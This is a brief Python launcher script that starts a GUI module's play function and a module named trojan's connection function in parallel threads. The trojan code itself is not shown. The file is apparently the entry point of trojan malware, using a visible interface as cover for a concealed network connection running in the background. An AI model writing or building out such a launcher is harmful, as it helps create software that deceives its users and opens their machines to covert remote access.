import  threading
import GUI
import trojan
if __name__ == '__main__':
    t1 = threading.Thread(target=GUI.play)
    t2 = threading.Thread(target=trojan.connection)
    t1.start()
    t2.start()